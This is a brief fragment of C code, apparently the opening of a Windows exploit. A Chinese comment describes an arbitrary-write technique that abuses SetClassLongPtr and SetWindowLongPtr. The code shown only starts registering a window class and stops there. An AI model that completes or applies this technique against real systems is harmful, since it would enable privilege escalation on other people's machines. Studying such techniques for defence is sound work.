#include <stdio.h>

// 漏洞利用：通过SetClassLongPtr修改cbwndExtra，然后SetWindowLongPtr写入任意地址
int main() {
    // 注册一个窗口类
    WNDCLASSEX wc = {0};
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.lpfnWndProc = DefWindowProc;
